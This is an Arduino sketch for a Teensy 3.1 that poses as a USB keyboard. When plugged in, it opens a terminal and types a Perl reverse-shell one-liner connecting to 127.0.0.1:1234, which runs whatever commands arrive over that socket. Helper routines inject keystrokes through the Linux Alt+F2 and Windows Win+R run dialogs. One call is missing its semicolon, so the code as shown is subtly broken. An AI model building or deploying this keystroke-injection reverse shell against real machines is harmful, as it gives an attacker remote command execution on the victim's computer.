// teensy 3.1

int led = 13;

void setup() {
  delay(1000);

  pinMode(led, OUTPUT);
  digitalWrite(led, HIGH);

  delay(1000);

  openTerminal()
  type("perl -MIO::Socket -e'$c=new IO::Socket::INET(\"127.0.0.1:1234\");print $c `$_`while<$c>'");
  type("exit");
}

// universal

// type text and hit enter

void type(String chars) {
  Keyboard.print(chars);
  delay(20);
  Keyboard.println("");
}

void openApp(String app) {
  Keyboard.print(app);
  delay(200);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

// Linux
void run(String cmd) {
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_F2);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  delay(50);
  Keyboard.send_now();
  Keyboard.print(cmd);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void openTerminal() {

  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(200);
}

// windows

void windowsRun(String cmd) {
  // Irongeek's PHUKD Library
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); //Windows key
  Keyboard.set_key1(KEY_R); // use r key
  Keyboard.send_now(); // send strokes
  Keyboard.set_modifier(0); //prep release of  control keys
  Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times.
  Keyboard.send_now(); //Send the key changes
  delay(500);
  Keyboard.print(cmd);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

// loop

void loop() {
  // flash when done
  digitalWrite(led, HIGH);
  delay(200);
  digitalWrite(led, LOW);
  delay(200);
}
